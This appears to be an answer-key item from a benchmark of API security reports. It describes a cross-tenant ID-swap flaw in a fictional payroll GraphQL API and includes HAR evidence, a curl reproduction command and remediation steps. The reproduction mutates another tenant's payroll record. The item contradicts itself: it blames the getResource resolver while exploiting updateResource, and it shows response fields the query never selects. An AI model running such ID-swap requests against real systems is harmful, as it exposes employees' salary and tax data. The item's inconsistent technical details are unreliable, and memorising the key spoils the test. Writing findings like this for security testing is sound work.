# Expected Response

## System
- **Domain:** HR / Payroll Processing
- **System:** WageFlow Payroll API
- **Example ID:** GQL-0196

## Priority Findings

### Finding 1: HR Payroll — Single-User ID Swap in updateResource Exposes Cross-Tenant Payroll Data (Pattern 10.1)
**Severity:** High
**Category:** Single-User / ID Swap in Own Request

**Summary:**
Per §4.0 (RISK-GQL-196): The `getResource` resolver fetches by `resourceId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 10.1 — ID swap in own request): the `updateResource` mutation allows a user to swap the resource ID in their own request to one belonging to another tenant, bypassing ownership checks. An attacker from `tenant-f17a` submitted `updateResource(id: "R-2196", input: {status: "approved", ownerId: "attacker-f17a3569"})` against a payroll record belonging to `tenant-3569`, receiving `CONFIDENTIAL-f17a3569`. In HR / Payroll, unauthorized access to salary records, tax data, and employee compensation constitutes a GDPR/employment law violation.

**Evidence from HAR:**
- Request: `POST https://api.wageflow-payroll-api.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-f17a`
- Mutation: `updateResource(id: "R-2196", input: {status: "approved", ownerId: "attacker-f17a3569"}) { resourceId status }`
- Response `200 OK`: `tenantId: "tenant-3569"`, `ownerId: "other-user-f17a3569"`, `sensitiveField: "CONFIDENTIAL-f17a3569"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-f17a3569`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-196 | getResource resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 10.1 | ID swap in own request |
| HAR mutation | id: "R-2196" | Cross-tenant payroll ID swap |
| HAR response | tenantId | tenant-3569 returned to tenant-f17a |
| HAR response | sensitiveField | CONFIDENTIAL-f17a3569 |
| HAR header | x-request-id | req-f17a3569 |

## Steps to Reproduce

### Step 1 — updateResource ID swap cross-tenant (HAR)
```bash
curl -s -X POST https://api.wageflow-payroll-api.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-f17a" \
  -d '{"query": "mutation { updateResource(id: \"R-2196\", input: {status: \"approved\", ownerId: \"attacker-f17a3569\"}) { resourceId status } }"}'
```
**Vulnerable:** `tenant-3569` payroll record mutated, returns `CONFIDENTIAL-f17a3569`. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id = $id AND tenant_id = $jwt.tenantId`.
2. Strip `ownerId` from `ResourceInput`; derive from JWT only.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
